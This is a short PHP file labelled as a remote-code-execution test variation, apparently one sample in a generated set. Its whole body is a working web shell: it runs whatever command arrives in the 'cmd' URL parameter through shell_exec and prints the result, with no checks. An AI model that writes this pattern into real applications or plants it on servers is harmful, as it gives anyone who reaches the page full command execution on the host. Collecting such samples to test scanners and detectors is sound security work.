<?php
// RCE test variation #1077
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>